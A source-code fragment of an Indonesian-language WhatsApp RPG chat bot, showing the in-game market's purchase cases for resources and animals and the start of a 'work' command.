        let uang12 = Number(parseInt(args[1]) * 50000)
        let jumlh12 = Number(args[1])
        if (`${db.users[m.sender].saldo}` < `${uang12}`) return reply(`*Saldo Kamu Tidak Cukup*`)
        db.users[m.sender].saldo -= uang12
        global.db.erpg[m.sender].diamond += parseInt(args[1])
        reply(`*MARKET - BELIğŸ›ï¸*\n\n*Item Dibeli:*\n  ${vircion} â€¢ Diamond: ${args[1]}\n\n*Dibayarkan:*\n  ${vircion} â€¢ Saldo: ${uang12}\n\n*Sisa Uang:*\n  ${vircion} â€¢ Saldo Total: ${db.users[m.sender].saldo}`)
        break
      case 'botol':
        if (!args[1]) return reply(`*Masukan Jumlahnya*\n\nContoh:\n${cmd} ${args[0]} 2`)
        if (isNaN(args[1])) return reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${cmd} ${args[0]} 2`)
        let uang13 = Number(parseInt(args[1]) * 200)
        let jumlh13 = Number(args[1])
        if (`${db.users[m.sender].saldo}` < `${uang13}`) return reply(`*Saldo Kamu Tidak Cukup*`)
        db.users[m.sender].saldo -= uang13
        global.db.erpg[m.sender].botol += parseInt(args[1])
        reply(`*MARKET - BELIğŸ›ï¸*\n\n*Item Dibeli:*\n  ${vircion} â€¢ Botol: ${args[1]}\n\n*Dibayarkan:*\n  ${vircion} â€¢ Saldo: ${uang13}\n\n*Sisa Uang:*\n  ${vircion} â€¢ Saldo Total: ${db.users[m.sender].saldo}`)
        break
      case 'kardus':
        if (!args[1]) return reply(`*Masukan Jumlahnya*\n\nContoh:\n${cmd} ${args[0]} 2`)
        if (isNaN(args[1])) return reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${cmd} ${args[0]} 2`)
        let uang14 = Number(parseInt(args[1]) * 200)
        let jumlh14 = Number(args[1])
        if (`${db.users[m.sender].saldo}` < `${uang14}`) return reply(`*Saldo Kamu Tidak Cukup*`)
        db.users[m.sender].saldo -= uang14
        global.db.erpg[m.sender].kardus += parseInt(args[1])
        reply(`*MARKET - BELIğŸ›ï¸*\n\n*Item Dibeli:*\n  ${vircion} â€¢ Kardus: ${args[1]}\n\n*Dibayarkan:*\n  ${vircion} â€¢ Saldo: ${uang14}\n\n*Sisa Uang:*\n  ${vircion} â€¢ Saldo Total: ${db.users[m.sender].saldo}`)
        break
      case 'kaleng':
        if (!args[1]) return reply(`*Masukan Jumlahnya*\n\nContoh:\n${cmd} ${args[0]} 2`)
        if (isNaN(args[1])) return reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${cmd} ${args[0]} 2`)
        let uang15 = Number(parseInt(args[1]) * 200)
        let jumlh15 = Number(args[1])
        if (`${db.users[m.sender].saldo}` < `${uang15}`) return reply(`*Saldo Kamu Tidak Cukup*`)
        db.users[m.sender].saldo -= uang15
        global.db.erpg[m.sender].kaleng += parseInt(args[1])
        reply(`*MARKET - BELIğŸ›ï¸*\n\n*Item Dibeli:*\n  ${vircion} â€¢ Kaleng: ${args[1]}\n\n*Dibayarkan:*\n  ${vircion} â€¢ Kaleng: ${uang15}\n\n*Sisa Uang:*\n  ${vircion} â€¢ Saldo Total: ${db.users[m.sender].saldo}`)
        break
      case 'gelas':
        if (!args[1]) return reply(`*Masukan Jumlahnya*\n\nContoh:\n${cmd} ${args[0]} 2`)
        if (isNaN(args[1])) return reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${cmd} ${args[0]} 2`)
        let uang16 = Number(parseInt(args[1]) * 200)
        let jumlh16 = Number(args[1])
        if (`${db.users[m.sender].saldo}` < `${uang16}`) return reply(`*Saldo Kamu Tidak Cukup*`)
        db.users[m.sender].saldo -= uang16
        global.db.erpg[m.sender].gelas += parseInt(args[1])
        reply(`*MARKET - BELIğŸ›ï¸*\n\n*Item Dibeli:*\n  ${vircion} â€¢ Gelas: ${args[1]}\n\n*Dibayarkan:*\n  ${vircion} â€¢ Saldo: ${uang16}\n\n*Sisa Uang:*\n  ${vircion} â€¢ Saldo Total: ${db.users[m.sender].saldo}`)
        break
      case 'plastik':
        if (!args[1]) return reply(`*Masukan Jumlahnya*\n\nContoh:\n${cmd} ${args[0]} 2`)
        if (isNaN(args[1])) return reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${cmd} ${args[0]} 2`)
        let uang17 = Number(parseInt(args[1]) * 200)
        let jumlh17 = Number(args[1])
        if (`${db.users[m.sender].saldo}` < `${uang17}`) return reply(`*Saldo Kamu Tidak Cukup*`)
        db.users[m.sender].saldo -= uang17
        global.db.erpg[m.sender].plastik += parseInt(args[1])
        reply(`*MARKET - BELIğŸ›ï¸*\n\n*Item Dibeli:*\n  ${vircion} â€¢ Plastik: ${args[1]}\n\n*Dibayarkan:*\n  ${vircion} â€¢ Saldo: ${uang17}\n\n*Sisa Uang:*\n  ${vircion} â€¢ Saldo Total: ${db.users[m.sender].saldo}`)
        break
      case 'banteng':
        if (!args[1]) return reply(`*Masukan Jumlahnya*\n\nContoh:\n${cmd} ${args[0]} 2`)
        if (isNaN(args[1])) return reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${cmd} ${args[0]} 2`)
        let uang18 = Number(parseInt(args[1]) * 30000)
        let jumlh18 = Number(args[1])
        if (`${db.users[m.sender].saldo}` < `${uang18}`) return reply(`*Saldo Kamu Tidak Cukup*`)
        db.users[m.sender].saldo -= uang18
        global.db.erpg[m.sender].banteng += parseInt(args[1])
        reply(`*MARKET - BELIğŸ›ï¸*\n\n*Item Dibeli:*\n  ${vircion} â€¢ Banteng: ${args[1]}\n\n*Dibayarkan:*\n  ${vircion} â€¢ Saldo: ${uang18}\n\n*Sisa Uang:*\n  ${vircion} â€¢ Saldo Total: ${db.users[m.sender].saldo}`)
        break
      case 'gajah':
        if (!args[1]) return reply(`*Masukan Jumlahnya*\n\nContoh:\n${cmd} ${args[0]} 2`)
        if (isNaN(args[1])) return reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${cmd} ${args[0]} 2`)
        let uang19 = Number(parseInt(args[1]) * 70000)
        let jumlh19 = Number(args[1])
        if (`${db.users[m.sender].saldo}` < `${uang19}`) return reply(`*Saldo Kamu Tidak Cukup*`)
        db.users[m.sender].saldo -= uang19
        global.db.erpg[m.sender].gajah += parseInt(args[1])
        reply(`*MARKET - BELIğŸ›ï¸*\n\n*Item Dibeli:*\n  ${vircion} â€¢ Gajah: ${args[1]}\n\n*Dibayarkan:*\n  ${vircion} â€¢ Saldo: ${uang19}\n\n*Sisa Uang:*\n  ${vircion} â€¢ Saldo Total: ${db.users[m.sender].saldo}`)
        break
      case 'harimau':
        if (!args[1]) return reply(`*Masukan Jumlahnya*\n\nContoh:\n${cmd} ${args[0]} 2`)
        if (isNaN(args[1])) return reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${cmd} ${args[0]} 2`)
        let uang20 = Number(parseInt(args[1]) * 100000)
        let jumlh20 = Number(args[1])
        if (`${db.users[m.sender].saldo}` < `${uang20}`) return reply(`*Saldo Kamu Tidak Cukup*`)
        db.users[m.sender].saldo -= uang20
        global.db.erpg[m.sender].harimau += parseInt(args[1])
        reply(`*MARKET - BELIğŸ›ï¸*\n\n*Item Dibeli:*\n  ${vircion} â€¢ Harimau: ${args[1]}\n\n*Dibayarkan:*\n  ${vircion} â€¢ Saldo: ${uang20}\n\n*Sisa Uang:*\n  ${vircion} â€¢ Saldo Total: ${db.users[m.sender].saldo}`)
        break
      case 'kambing':
        if (!args[1]) return reply(`*Masukan Jumlahnya*\n\nContoh:\n${cmd} ${args[0]} 2`)
        if (isNaN(args[1])) return reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${cmd} ${args[0]} 2`)
        let uang21 = Number(parseInt(args[1]) * 30000)
        let jumlh21 = Number(args[1])
        if (`${db.users[m.sender].saldo}` < `${uang21}`) return reply(`*Saldo Kamu Tidak Cukup*`)
        db.users[m.sender].saldo -= uang21
        global.db.erpg[m.sender].kambing += parseInt(args[1])
        reply(`*MARKET - BELIğŸ›ï¸*\n\n*Item Dibeli:*\n  ${vircion} â€¢ Kambing: ${args[1]}\n\n*Dibayarkan:*\n  ${vircion} â€¢ Saldo: ${uang21}\n\n*Sisa Uang:*\n  ${vircion} â€¢ Saldo Total: ${db.users[m.sender].saldo}`)
        break
      case 'panda':
        if (!args[1]) return reply(`*Masukan Jumlahnya*\n\nContoh:\n${cmd} ${args[0]} 2`)
        if (isNaN(args[1])) return reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${cmd} ${args[0]} 2`)
        let uang22 = Number(parseInt(args[1]) * 40000)
        let jumlh22 = Number(args[1])
        if (`${db.users[m.sender].saldo}` < `${uang22}`) return reply(`*Saldo Kamu Tidak Cukup*`)
        db.users[m.sender].saldo -= uang22
        global.db.erpg[m.sender].panda += parseInt(args[1])
        reply(`*MARKET - BELIğŸ›ï¸*\n\n*Item Dibeli:*\n  ${vircion} â€¢ Panda: ${args[1]}\n\n*Dibayarkan:*\n  ${vircion} â€¢ Saldo: ${uang22}\n\n*Sisa Uang:*\n  ${vircion} â€¢ Saldo Total: ${db.users[m.sender].saldo}`)
        break
      case 'buaya':
        if (!args[1]) return reply(`*Masukan Jumlahnya*\n\nContoh:\n${cmd} ${args[0]} 2`)
        if (isNaN(args[1])) return reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${cmd} ${args[0]} 2`)
        let uang23 = Number(parseInt(args[1]) * 20000)
        let jumlh23 = Number(args[1])
        if (`${db.users[m.sender].saldo}` < `${uang23}`) return reply(`*Saldo Kamu Tidak Cukup*`)
        db.users[m.sender].saldo -= uang23
        global.db.erpg[m.sender].buaya += parseInt(args[1])
        reply(`*MARKET - BELIğŸ›ï¸*\n\n*Item Dibeli:*\n  ${vircion} â€¢ Buaya: ${args[1]}\n\n*Dibayarkan:*\n  ${vircion} â€¢ Saldo: ${uang23}\n\n*Sisa Uang:*\n  ${vircion} â€¢ Saldo Total: ${db.users[m.sender].saldo}`)
        break
      case 'kerbau':
        if (!args[1]) return reply(`*Masukan Jumlahnya*\n\nContoh:\n${cmd} ${args[0]} 2`)
        if (isNaN(args[1])) return reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${cmd} ${args[0]} 2`)
        let uang24 = Number(parseInt(args[1]) * 40000)
        let jumlh24 = Number(args[1])
        if (`${db.users[m.sender].saldo}` < `${uang24}`) return reply(`*Saldo Kamu Tidak Cukup*`)
        db.users[m.sender].saldo -= uang24
        global.db.erpg[m.sender].kerbau += parseInt(args[1])
        reply(`*MARKET - BELIğŸ›ï¸*\n\n*Item Dibeli:*\n  ${vircion} â€¢ Kerbau: ${args[1]}\n\n*Dibayarkan:*\n  ${vircion} â€¢ Saldo: ${uang24}\n\n*Sisa Uang:*\n  ${vircion} â€¢ Saldo Total: ${db.users[m.sender].saldo}`)
        break
      case 'monyet':
        if (!args[1]) return reply(`*Masukan Jumlahnya*\n\nContoh:\n${cmd} ${args[0]} 2`)
        if (isNaN(args[1])) return reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${cmd} ${args[0]} 2`)
        let uang25 = Number(parseInt(args[1]) * 20000)
        let jumlh25 = Number(args[1])
        if (`${db.users[m.sender].saldo}` < `${uang25}`) return reply(`*Saldo Kamu Tidak Cukup*`)
        db.users[m.sender].saldo -= uang25
        global.db.erpg[m.sender].monyet += parseInt(args[1])
        reply(`*MARKET - BELIğŸ›ï¸*\n\n*Item Dibeli:*\n  ${vircion} â€¢ Monyet: ${args[1]}\n\n*Dibayarkan:*\n  ${vircion} â€¢ Saldo: ${uang25}\n\n*Sisa Uang:*\n  ${vircion} â€¢ Saldo Total: ${db.users[m.sender].saldo}`)
        break
      case 'babihutan':
        if (!args[1]) return reply(`*Masukan Jumlahnya*\n\nContoh:\n${cmd} ${args[0]} 2`)
        if (isNaN(args[1])) return reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${cmd} ${args[0]} 2`)
        let uang26 = Number(parseInt(args[1]) * 20000)
        let jumlh26 = Number(args[1])
        if (`${db.users[m.sender].saldo}` < `${uang26}`) return reply(`*Saldo Kamu Tidak Cukup*`)
        db.users[m.sender].saldo -= uang26
        global.db.erpg[m.sender].babihutan += parseInt(args[1])
        reply(`*MARKET - BELIğŸ›ï¸*\n\n*Item Dibeli:*\n  ${vircion} â€¢ Babi Hutan: ${args[1]}\n\n*Dibayarkan:*\n  ${vircion} â€¢ Saldo: ${uang26}\n\n*Sisa Uang:*\n  ${vircion} â€¢ Saldo Total: ${db.users[m.sender].saldo}`)
        break
      case 'babi':
        if (!args[1]) return reply(`*Masukan Jumlahnya*\n\nContoh:\n${cmd} ${args[0]} 2`)
        if (isNaN(args[1])) return reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${cmd} ${args[0]} 2`)
        let uang27 = Number(parseInt(args[1]) * 20000)
        let jumlh27 = Number(args[1])
        if (`${db.users[m.sender].saldo}` < `${uang27}`) return reply(`*Saldo Kamu Tidak Cukup*`)
        db.users[m.sender].saldo -= uang27
        global.db.erpg[m.sender].babi += parseInt(args[1])
        reply(`*MARKET - BELIğŸ›ï¸*\n\n*Item Dibeli:*\n  ${vircion} â€¢ Babi: ${args[1]}\n\n*Dibayarkan:*\n  ${vircion} â€¢ Saldo: ${uang27}\n\n*Sisa Uang:*\n  ${vircion} â€¢ Saldo Total: ${db.users[m.sender].saldo}`)
        break
      case 'limit':
        if (!args[1]) return reply(`*Masukan Jumlahnya*\n\nContoh:\n${cmd} ${args[0]} 2`)
        if (isNaN(args[1])) return reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${cmd} ${args[0]} 2`)
        let uang28 = Number(parseInt(args[1]) * 10000)
        let jumlh28 = Number(args[1])
        if (`${db.users[m.sender].saldo}` < `${uang28}`) return reply(`*Saldo Kamu Tidak Cukup*`)
        db.users[m.sender].saldo -= uang28
        db.users[m.sender].limit += parseInt(args[1])
        reply(`*MARKET - BELIğŸ›ï¸*\n\n*Item Dibeli:*\n  ${vircion} â€¢ Limit: ${args[1]}\n\n*Dibayarkan:*\n  ${vircion} â€¢ Saldo: ${uang28}\n\n*Sisa Uang:*\n  ${vircion} â€¢ Saldo Total: ${db.users[m.sender].saldo}`)
        break
      case 'glimit':
      case 'gamelimit':
        if (!args[1]) return reply(`*Masukan Jumlahnya*\n\nContoh:\n${cmd} ${args[0]} 2`)
        if (isNaN(args[1])) return reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${cmd} ${args[0]} 2`)
        let uang29 = Number(parseInt(args[1]) * 10000)
        let jumlh29 = Number(args[1])
        if (`${db.users[m.sender].saldo}` < `${uang29}`) return reply(`*Saldo Kamu Tidak Cukup*`)
        db.users[m.sender].saldo -= uang29
        db.users[m.sender].glimit += parseInt(args[1])
        reply(`*MARKET - BELIğŸ›ï¸*\n\n*Item Dibeli:*\n  ${vircion} â€¢ Game Limit: ${args[1]}\n\n*Dibayarkan:*\n  ${vircion} â€¢ Saldo: ${uang29}\n\n*Sisa Uang:*\n  ${vircion} â€¢ Saldo Total: ${db.users[m.sender].saldo}`)
        break
      case 'paus':
        if (!args[1]) return reply(`*Masukan Jumlahnya*\n\nContoh:\n${cmd} ${args[0]} 2`)
        if (isNaN(args[1])) return reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${cmd} ${args[0]} 2`)
        let uang30 = Number(parseInt(args[1]) * 78000500)
        let jumlh30 = Number(args[1])
        if (`${db.users[m.sender].saldo}` < `${uang30}`) return reply(`*Saldo Kamu Tidak Cukup*`)
        db.users[m.sender].saldo -= uang30
        global.db.erpg[m.sender].paus += parseInt(args[1])
        reply(`*MARKET - BELIğŸ›ï¸*\n\n*Item Dibeli:*\n  ${vircion} â€¢ Paus: ${args[1]}\n\n*Dibayarkan:*\n  ${vircion} â€¢ Saldo: ${uang30}\n\n*Sisa Uang:*\n  ${vircion} â€¢ Saldo Total: ${db.users[m.sender].saldo}`)
        break
      case 'kepiting':
        if (!args[1]) return reply(`*Masukan Jumlahnya*\n\nContoh:\n${cmd} ${args[0]} 2`)
        if (isNaN(args[1])) return reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${cmd} ${args[0]} 2`)
        let uang31 = Number(parseInt(args[1]) * 2000)
        let jumlh31 = Number(args[1])
        if (`${db.users[m.sender].saldo}` < `${uang31}`) return reply(`*Saldo Kamu Tidak Cukup*`)
        db.users[m.sender].saldo -= uang31
        global.db.erpg[m.sender].kepiting += parseInt(args[1])
        reply(`*MARKET - BELIğŸ›ï¸*\n\n*Item Dibeli:*\n  ${vircion} â€¢ Kepiting: ${args[1]}\n\n*Dibayarkan:*\n  ${vircion} â€¢ Saldo: ${uang31}\n\n*Sisa Uang:*\n  ${vircion} â€¢ Saldo Total: ${db.users[m.sender].saldo}`)
        break
      case 'gurita':
        if (!args[1]) return reply(`*Masukan Jumlahnya*\n\nContoh:\n${cmd} ${args[0]} 2`)
        if (isNaN(args[1])) return reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${cmd} ${args[0]} 2`)
        let uang32 = Number(parseInt(args[1]) * 3000)
        let jumlh32 = Number(args[1])
        if (`${db.users[m.sender].saldo}` < `${uang32}`) return reply(`*Saldo Kamu Tidak Cukup*`)
        db.users[m.sender].saldo -= uang32
        global.db.erpg[m.sender].gurita += parseInt(args[1])
        reply(`*MARKET - BELIğŸ›ï¸*\n\n*Item Dibeli:*\n  ${vircion} â€¢ Gurita: ${args[1]}\n\n*Dibayarkan:*\n  ${vircion} â€¢ Saldo: ${uang32}\n\n*Sisa Uang:*\n  ${vircion} â€¢ Saldo Total: ${db.users[m.sender].saldo}`)
        break
      case 'cumi':
        if (!args[1]) return reply(`*Masukan Jumlahnya*\n\nContoh:\n${cmd} ${args[0]} 2`)
        if (isNaN(args[1])) return reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${cmd} ${args[0]} 2`)
        let uang33 = Number(parseInt(args[1]) * 2000)
        let jumlh33 = Number(args[1])
        if (`${db.users[m.sender].saldo}` < `${uang33}`) return reply(`*Saldo Kamu Tidak Cukup*`)
        db.users[m.sender].saldo -= uang33
        global.db.erpg[m.sender].cumi += parseInt(args[1])
        reply(`*MARKET - BELIğŸ›ï¸*\n\n*Item Dibeli:*\n  ${vircion} â€¢ Cumi: ${args[1]}\n\n*Dibayarkan:*\n  ${vircion} â€¢ Saldo: ${uang33}\n\n*Sisa Uang:*\n  ${vircion} â€¢ Saldo Total: ${db.users[m.sender].saldo}`)
        break
      case 'buntal':
        if (!args[1]) return reply(`*Masukan Jumlahnya*\n\nContoh:\n${cmd} ${args[0]} 2`)
        if (isNaN(args[1])) return reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${cmd} ${args[0]} 2`)
        let uang34 = Number(parseInt(args[1]) * 1000)
        let jumlh34 = Number(args[1])
        if (`${db.users[m.sender].saldo}` < `${uang34}`) return reply(`*Saldo Kamu Tidak Cukup*`)
        db.users[m.sender].saldo -= uang34
        global.db.erpg[m.sender].buntal += parseInt(args[1])
        reply(`*MARKET - BELIğŸ›ï¸*\n\n*Item Dibeli:*\n  ${vircion} â€¢ Buntal: ${args[1]}\n\n*Dibayarkan:*\n  ${vircion} â€¢ Saldo: ${uang34}\n\n*Sisa Uang:*\n  ${vircion} â€¢ Saldo Total: ${db.users[m.sender].saldo}`)
        break
      case 'dory':
        if (!args[1]) return reply(`*Masukan Jumlahnya*\n\nContoh:\n${cmd} ${args[0]} 2`)
        if (isNaN(args[1])) return reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${cmd} ${args[0]} 2`)
        let uang35 = Number(parseInt(args[1]) * 7000)
        let jumlh35 = Number(args[1])
        if (`${db.users[m.sender].saldo}` < `${uang35}`) return reply(`*Saldo Kamu Tidak Cukup*`)
        db.users[m.sender].saldo -= uang35
        global.db.erpg[m.sender].dory += parseInt(args[1])
        reply(`*MARKET - BELIğŸ›ï¸*\n\n*Item Dibeli:*\n  ${vircion} â€¢ Dory: ${args[1]}\n\n*Dibayarkan:*\n  ${vircion} â€¢ Saldo: ${uang35}\n\n*Sisa Uang:*\n  ${vircion} â€¢ Saldo Total: ${db.users[m.sender].saldo}`)
        break
      case 'lumba':
        if (!args[1]) return reply(`*Masukan Jumlahnya*\n\nContoh:\n${cmd} ${args[0]} 2`)
        if (isNaN(args[1])) return reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${cmd} ${args[0]} 2`)
        let uang36 = Number(parseInt(args[1]) * 674000)
        let jumlh36 = Number(args[1])
        if (`${db.users[m.sender].saldo}` < `${uang36}`) return reply(`*Saldo Kamu Tidak Cukup*`)
        db.users[m.sender].saldo -= uang36
        global.db.erpg[m.sender].lumba += parseInt(args[1])
        reply(`*MARKET - BELIğŸ›ï¸*\n\n*Item Dibeli:*\n  ${vircion} â€¢ Lumba": ${args[1]}\n\n*Dibayarkan:*\n  ${vircion} â€¢ Saldo: ${uang36}\n\n*Sisa Uang:*\n  ${vircion} â€¢ Saldo Total: ${db.users[m.sender].saldo}`)
        break
      case 'lobster':
        if (!args[1]) return reply(`*Masukan Jumlahnya*\n\nContoh:\n${cmd} ${args[0]} 2`)
        if (isNaN(args[1])) return reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${cmd} ${args[0]} 2`)
        let uang37 = Number(parseInt(args[1]) * 3000)
        let jumlh37 = Number(args[1])
        if (`${db.users[m.sender].saldo}` < `${uang37}`) return reply(`*Saldo Kamu Tidak Cukup*`)
        db.users[m.sender].saldo -= uang37
        global.db.erpg[m.sender].lobster += parseInt(args[1])
        reply(`*MARKET - BELIğŸ›ï¸*\n\n*Item Dibeli:*\n  ${vircion} â€¢ Lobster: ${args[1]}\n\n*Dibayarkan:*\n  ${vircion} â€¢ Saldo: ${uang37}\n\n*Sisa Uang:*\n  ${vircion} â€¢ Saldo Total: ${db.users[m.sender].saldo}`)
        break
      case 'hiu':
        if (!args[1]) return reply(`*Masukan Jumlahnya*\n\nContoh:\n${cmd} ${args[0]} 2`)
        if (isNaN(args[1])) return reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${cmd} ${args[0]} 2`)
        let uang38 = Number(parseInt(args[1]) * 8750000)
        let jumlh38 = Number(args[1])
        if (`${db.users[m.sender].saldo}` < `${uang38}`) return reply(`*Saldo Kamu Tidak Cukup*`)
        db.users[m.sender].saldo -= uang38
        global.db.erpg[m.sender].hiu += parseInt(args[1])
        reply(`*MARKET - BELIğŸ›ï¸*\n\n*Item Dibeli:*\n  ${vircion} â€¢ Hiu: ${args[1]}\n\n*Dibayarkan:*\n  ${vircion} â€¢ Saldo: ${uang38}\n\n*Sisa Uang:*\n  ${vircion} â€¢ Saldo Total: ${db.users[m.sender].saldo}`)
        break
      case 'udang':
        if (!args[1]) return reply(`*Masukan Jumlahnya*\n\nContoh:\n${cmd} ${args[0]} 2`)
        if (isNaN(args[1])) return reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${cmd} ${args[0]} 2`)
        let uang39 = Number(parseInt(args[1]) * 1000)
        let jumlh39 = Number(args[1])
        if (`${db.users[m.sender].saldo}` < `${uang39}`) return reply(`*Saldo Kamu Tidak Cukup*`)
        db.users[m.sender].saldo -= uang39
        global.db.erpg[m.sender].udang += parseInt(args[1])
        reply(`*MARKET - BELIğŸ›ï¸*\n\n*Item Dibeli:*\n  ${vircion} â€¢ Udang: ${args[1]}\n\n*Dibayarkan:*\n  ${vircion} â€¢ Saldo: ${uang39}\n\n*Sisa Uang:*\n  ${vircion} â€¢ Saldo Total: ${db.users[m.sender].saldo}`)
        break
      case 'orca':
        if (!args[1]) return reply(`*Masukan Jumlahnya*\n\nContoh:\n${cmd} ${args[0]} 2`)
        if (isNaN(args[1])) return reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${cmd} ${args[0]} 2`)
        let uang40 = Number(parseInt(args[1]) * 12000)
        let jumlh40 = Number(args[1])
        if (`${db.users[m.sender].saldo}` < `${uang40}`) return reply(`*Saldo Kamu Tidak Cukup*`)
        db.users[m.sender].saldo -= uang40
        global.db.erpg[m.sender].orca += parseInt(args[1])
        reply(`*MARKET - BELIğŸ›ï¸*\n\n*Item Dibeli:*\n  ${vircion} â€¢ Orca: ${args[1]}\n\n*Dibayarkan:*\n  ${vircion} â€¢ Saldo: ${uang40}\n\n*Sisa Uang:*\n  ${vircion} â€¢ Saldo Total: ${db.users[m.sender].saldo}`)
        break
      case 'potion':
        if (!args[1]) return reply(`*Masukan Jumlahnya*\n\nContoh:\n${cmd} ${args[0]} 2`)
        if (isNaN(args[1])) return reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${cmd} ${args[0]} 2`)
        let uang41 = Number(parseInt(args[1]) * 1000)
        let jumlh41 = Number(args[1])
        if (`${db.users[m.sender].saldo}` < `${uang41}`) return reply(`*Saldo Kamu Tidak Cukup*`)
        db.users[m.sender].saldo -= uang41
        global.db.erpg[m.sender].potion += parseInt(args[1])
        reply(`*MARKET - BELIğŸ›ï¸*\n\n*Item Dibeli:*\n  ${vircion} â€¢ Potion: ${args[1]}\n\n*Dibayarkan:*\n  ${vircion} â€¢ Saldo: ${uang41}\n\n*Sisa Uang:*\n  ${vircion} â€¢ Saldo Total: ${db.users[m.sender].saldo}`)
        break
      default:
        let teks = `------- Â» *ğŸ›ï¸ MARKET ğŸ›ï¸* Â« -------\n\n\n*Sumber Daya ğŸ§°*\n  ${vircion} â€¢ rumah -Rp 2.000.000\n  ${vircion} â€¢ potion -Rp 1.000\n  ${vircion} â€¢ Limit: -Rp 1000 1.000\n  ${vircion} â€¢ GameLimit: -Rp 1.000\n  ${vircion} â€¢ emas -Rp 20.500\n  ${vircion} â€¢ besi -Rp 1.500\n  ${vircion} â€¢ batubara -Rp 1.000\n  ${vircion} â€¢ perak -Rp 2.000\n  ${vircion} â€¢ kayu -Rp 500\n  ${vircion} â€¢ emerald -Rp 20.000\n  ${vircion} â€¢ diamond -Rp 50.000\n  ${vircion} â€¢ botol -Rp 200\n  ${vircion} â€¢ kardus -Rp 200\n  ${vircion} â€¢ kaleng -Rp 200\n  ${vircion} â€¢ gelas -Rp 200\n  ${vircion} â€¢ plastik -Rp 200\n\n*Hewan DaratğŸŒ¿*\n  ${vircion} â€¢ ayam -Rp 500\n  ${vircion} â€¢ sapi -Rp 3.000\n  ${vircion} â€¢ domba -Rp 2.000\n  ${vircion} â€¢ banteng -Rp 30.000\n  ${vircion} â€¢ gajah -Rp 70.000\n  ${vircion} â€¢ harimau -Rp 100.000\n  ${vircion} â€¢ kambing -Rp 30000\n  ${vircion} â€¢ panda -Rp 40.000\n  ${vircion} â€¢ buaya -Rp 20.000\n  ${vircion} â€¢ kerbau -Rp 40.000\n  ${vircion} â€¢ monyet -Rp 20.000\n  ${vircion} â€¢ babihutan -Rp 40.000\n  ${vircion} â€¢ babi -Rp 20.000\n\n*Hewan Laut ğŸŒŠ*\n  ${vircion} â€¢ ikan -Rp 200\n  ${vircion} â€¢ paus -Rp 78000500\n  ${vircion} â€¢ kepiting -Rp 2000\n  ${vircion} â€¢ gurita -Rp 3000\n  ${vircion} â€¢ cumi -Rp 2000\n  ${vircion} â€¢ buntal -Rp 1000\n  ${vircion} â€¢ dory -Rp 7000\n  ${vircion} â€¢ lumba -Rp 674000\n  ${vircion} â€¢ lobster -Rp 3000\n  ${vircion} â€¢ hiu -Rp 8750000\n  ${vircion} â€¢ udang -Rp 1000\n  ${vircion} â€¢ orca -Rp 12000\n_____________________________\n\n*Tutorials :*\nâ  To Buy Items:\n.buy [item] [quantity]\nâ–§ Example:\n.buy emas 10`
        sock.sendMessage(m.chat, { text: teks, contextInfo: { mentionedJid: [m.sender], forwardingScore: 9999, isForwarded: true, forwardedNewsletterMessageInfo: { newsletterJid: null + "@newsletter", serverMessageId: null, newsletterName: `${namaBot}` }, externalAdReply: { title: "BUY MARKET", body: 'Sell goods to earn money', thumbnailUrl: "https://telegra.ph/file/df72d0f6cc35b7581594b.jpg", sourceUrl: "-", mediaType: 1, renderLargerThumbnail: true } } }, { quoted: fakeQuoted })
    }
    break
  }

  case 'bekerja':
  case 'kerja': {
    let setting = JSON.parse(fs.readFileSync('./rpg.json'))
    if (setting.rpgsetStats) return reply('Fitur rpg dimatikan oleh owner')
    if (!global.db.erpg[m.sender].rpg) return reply(`â€” *Join RPG Terlebih Dahulu*\n\nketik _.joinrpg_`)
    if (global.db.erpg[m.sender].stamina < 1) return reply(`Kamu Lemah, stamina kamu ${global.db.erpg[m.sender].stamina}%\n\nKetik _.heal_`)
    let type = (args[0] || '').toLowerCase()
    let time = global.db.erpg[m.sender].lastkerja + 600000
    let __timers = (new Date - global.db.erpg[m.sender].lastkerja)
    let _timers = (0 - __timers)
    let timers = clockString(_timers)
    let penumpan = ['mas mas', 'bapak bapak', 'cewe sma', 'bocil epep', 'emak emak']
    let penumpang = await pickRandom(penumpan)
    let daganga = ['wortel', 'sawi', 'selada', 'tomat', 'seledri', 'cabai', 'daging', 'ikan', 'ayam']
    let dagangan = await pickRandom(daganga)
    let pasie = ['sakit kepala', 'cedera', 'luka bakar', 'patah tulang']
    let pasien = await pickRandom(pasie)
    let pane = ['Wortel', 'Kubis', 'stowbery', 'teh', 'padi', 'jeruk', 'pisang', 'semangka', 'durian', 'rambutan']
    let panen = await pickRandom(pane)
    let bengke = ['mobil', 'motor', 'becak', 'bajai', 'bus', 'angkot', 'becak', 'sepeda']
    let bengkel = await pickRandom(bengke)
    let ruma = ['Membangun Rumah', 'Membangun Gedung', 'Memperbaiki Rumah', 'Memperbaiki Gedung', 'Membangun Fasilitas Umum', 'Memperbaiki Fasilitas Umum']
    let rumah = await pickRandom(ruma)
    switch (type) {
      case 'ojek':
